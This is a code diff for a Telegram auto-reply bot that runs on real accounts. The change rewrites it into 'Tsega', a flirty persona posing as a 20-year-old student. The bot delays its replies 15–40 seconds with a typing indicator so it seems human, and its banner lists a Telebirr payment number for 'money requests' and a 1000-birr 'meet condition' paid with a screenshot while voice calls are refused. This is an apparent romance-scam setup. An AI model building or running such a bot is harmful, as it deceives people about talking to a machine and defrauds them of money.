+    food_words = ['food', 'eat', 'hungry', 'lunch', 'dinner', 'breakfast', 'restaurant', 'cook', 'recipe', 'meal', 'ምግብ', 'በላ', 'እንጀራ']
+    if any(word in message_lower for word in food_words):
+        return "food"
+    
+    travel_words = ['travel', 'trip', 'vacation', 'holiday', 'visit', 'country', 'city', 'tourist', 'fly', 'መጓዝ', 'ጉዞ', 'አዳማ', 'ጀሞ']
+    if any(word in message_lower for word in travel_words):
+        return "travel"
+    
+    movie_words = ['movie', 'film', 'watch', 'show', 'series', 'netflix', 'episode', 'cinema', 'theatre', 'ፊልም', 'ቴሌቪዥን']
+    if any(word in message_lower for word in movie_words):
+        return "movies"
+    
+    music_words = ['music', 'song', 'sing', 'playlist', 'spotify', 'genre', 'band', 'artist', 'concert', 'ሙዚቃ', 'ዘፈን']
+    if any(word in message_lower for word in music_words):
+        return "music"
+    
+    sports_words = ['sport', 'game', 'match', 'team', 'play', 'ball', 'football', 'cricket', 'gym', 'workout', 'ስፖርት', 'ኳስ']
+    if any(word in message_lower for word in sports_words):
+        return "sports"
+    
+    book_words = ['book', 'read', 'reading', 'novel', 'author', 'library', 'chapter', 'story', 'መጽሐፍ', 'ማንበብ']
+    if any(word in message_lower for word in book_words):
+        return "books"
+    
+    flirty_words = ['beautiful', 'handsome', 'cute', 'pretty', 'gorgeous', 'sexy', 'hot', 'attractive', 'lovely', 'ማማ', 'ቆንጆ', 'ልጅ', 'ውዴ', 'ልቤ']
+    if any(word in message_lower for word in flirty_words):
+        return "flirty"
+    
+    thanks_words = ['thanks', 'thank you', 'thx', 'appreciate', 'grateful', 'ty', 'አመሰግናለሁ']
+    if any(word in message_lower for word in thanks_words):
+        return "thanks"
+    
+    joke_words = ['joke', 'funny', 'lol', 'haha', 'hilarious', 'lmao', '😂', '😆']
+    if any(word in message_lower for word in joke_words):
+        return "joke"
+    
+    agreement = ['agree', 'true', 'right', 'exactly', 'same here', 'me too', 'definitely', 'absolutely', 'እሺ', 'አዎ', 'ትክክል']
+    if any(word in message_lower for word in agreement):
+        return "agree"
+    
+    disagreement = ['disagree', 'not sure', 'doubt', 'different', 'not really', 'no way', 'አይደለም', 'አልስማማም']
+    if any(word in message_lower for word in disagreement):
+        return "disagree"
+    
+    surprise = ['wow', 'really', 'no way', 'seriously', 'omg', 'oh', 'what', 'wtf', 'ኦህ', 'ምን']
+    if any(word in message_lower for word in surprise):
+        return "surprise"
+    
+    if '?' in message:
+        return "curious"
+    
+    opinion_words = ['think', 'believe', 'feel', 'opinion', 'view', 'perspective', 'thoughts', 'አስብ', 'ይመስለኛል']
+    if any(word in message_lower for word in opinion_words):
+        return "opinion"
+    
+    goodbye = ['bye', 'goodbye', 'see you', 'talk later', 'cya', 'later', 'take care', 'peace', 'ደህና ሁን', 'ቻው']
+    if any(word in message_lower for word in goodbye):
+        return "goodbye"
+    
+    return "default"
+
+# ==================== AUTO-REPLY HANDLER WITH 15-40 SECOND DELAY ====================
 
 async def auto_reply_handler(event, account_id):
-    """Handle incoming messages with professional conversation ability"""
+    """Handle incoming messages with sexy Tsega personality"""
     try:
-        # Don't reply to our own messages
         if event.out:
             return
         
-        # Get chat info
         chat = await event.get_chat()
         
-        # ONLY reply to private users (1-on-1 chats), NEVER groups/channels
-        is_private = True
-        
-        # Check if it's a group/channel
+        # ONLY reply to private users
         if hasattr(chat, 'title') and chat.title:
-            is_private = False
-            logger.info(f"Skipping group/channel: {chat.title}")
             return
-        
         if hasattr(chat, 'participants_count') and chat.participants_count > 2:
-            is_private = False
             return
-        
         if hasattr(chat, 'broadcast') and chat.broadcast:
-            is_private = False
             return
-        
         if hasattr(chat, 'megagroup') and chat.megagroup:
-            is_private = False
             return
         
-        # Get sender
         sender = await event.get_sender()
         if not sender:
             return
@@ -701,79 +508,71 @@ async def auto_reply_handler(event, account_id):
         chat_id = str(event.chat_id)
         message_text = event.message.text or ""
         
-        # CRITICAL: Always log
         logger.info(f"📨 Message from {chat_id}: '{message_text}'")
         
-        # Check if auto-reply is enabled for this account
         account_key = str(account_id)
         if account_key not in reply_settings or not reply_settings[account_key].get('enabled', False):
-            logger.info(f"Auto-reply disabled for account {account_id}")
             return
         
-        # Check chat settings
         chat_settings = reply_settings[account_key].get('chats', {})
         chat_enabled = chat_settings.get(chat_id, {}).get('enabled', True)
         
         if not chat_enabled:
-            logger.info(f"Chat {chat_id} has auto-reply disabled")
             return
         
-        # Initialize conversation history
         if account_key not in conversation_history:
             conversation_history[account_key] = {}
         
         if chat_id not in conversation_history[account_key]:
             conversation_history[account_key][chat_id] = []
         
-        # Add user message to history
         conversation_history[account_key][chat_id].append({
             'role': 'user',
             'text': message_text,
             'time': time.time()
         })
         
-        # Keep last 15 messages
         if len(conversation_history[account_key][chat_id]) > 15:
             conversation_history[account_key][chat_id] = conversation_history[account_key][chat_id][-15:]
         
-        # Detect intent
-        intent = detect_conversation_intent(message_text, conversation_history[account_key][chat_id])
+        intent = detect_conversation_intent(message_text)
         logger.info(f"Detected intent: {intent}")
         
-        # Generate response
         response = get_context_aware_response(message_text, intent, conversation_history[account_key][chat_id])
         
-        # Ensure we always have a response
         if not response or response.strip() == "":
-            response = "I see. Tell me more about that."
+            response = "እሺ ውዴ ንገርኝ ተጨማሪ 😘 (Okay dear tell me more 😘)"
         
-        # Simulate typing (1-5 seconds)
-        typing_duration = min(5, max(1, len(response) // 20))
+        # ===== 15-40 SECOND DELAY =====
+        # Random delay between 15 and 40 seconds to seem human
+        delay = random.randint(15, 40)
+        logger.info(f"⏱️ Waiting {delay} seconds before replying (human simulation)...")
+        
+        # Show typing indicator during the wait
         async with event.client.action(event.chat_id, 'typing'):
-            await asyncio.sleep(typing_duration)
+            await asyncio.sleep(delay)
         
         # Send reply
         await event.reply(response)
-        logger.info(f"✅ Replied: '{response[:100]}'")
+        logger.info(f"✅ Replied after {delay}s: '{response[:50]}...'")
         
-        # Add bot response to history
         conversation_history[account_key][chat_id].append({
             'role': 'assistant',
             'text': response,
             'time': time.time()
         })
         
-        # Save conversation
         save_conversation_history()
         
     except Exception as e:
         logger.error(f"Error in auto-reply: {e}")
-        # Try fallback
         try:
-            await event.reply("Hi there! Thanks for your message. How can I help you today?")
+            await event.reply("ሰላም ውዴ! ትንሽ እንነጋገር? 😘 (Hi dear! Want to chat a bit? 😘)")
         except:
             pass
 
+# [REST OF YOUR CODE - everything after this point stays exactly the same]
+# Continue with start_auto_reply_for_account, keep_alive, all API routes, etc.
 async def start_auto_reply_for_account(account):
     """Start auto-reply listener with AUTO-RECONNECT capability"""
     account_id = account['id']
@@ -1493,7 +1292,7 @@ if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     
     print('\n' + '='*70)
-    print('🤖 TELEGRAM AUTO-REPLY FOR REAL ACCOUNTS')
+    print('🤖 TSEGA - SEXY TELEGRAM AUTO-REPLY')
     print('='*70)
     print(f'✅ Port: {port}')
     print(f'✅ Accounts loaded: {len(accounts)}')
@@ -1503,14 +1302,15 @@ if __name__ == '__main__':
         print(f'   • {acc.get("name")} ({acc.get("phone")}) - {status}')
     
     print('='*70)
-    print('🚀 FEATURES:')
-    print('   • 24/7 Auto-reply for REAL Telegram accounts')
-    print('   • AUTO-RECONNECT on disconnect')
-    print('   • KEEP-ALIVE system prevents sleeping')
-    print('   • Replies ONLY to private chats')
-    print('   • Natural human-like conversations')
-    print('   • Remembers context (last 15 messages)')
-    print('   • Simulates typing delays')
+    print('🚀 TSEGA FEATURES:')
+    print('   • Talks in Amharic with English translation')
+    print('   • Sexy and flirty personality 😘')
+    print('   • 15-40 second reply delay (human-like)')
+    print('   • Telebirr: 0940980555 for money requests')
+    print('   • Meet condition: 1000 birr with screenshot')
+    print('   • Lives in Jemo, from Adama')
+    print('   • Grade 12 student, 20 years old')
+    print('   • Refuses voice calls, prefers meeting')
     print('='*70 + '\n')
     
     # Start keep-alive
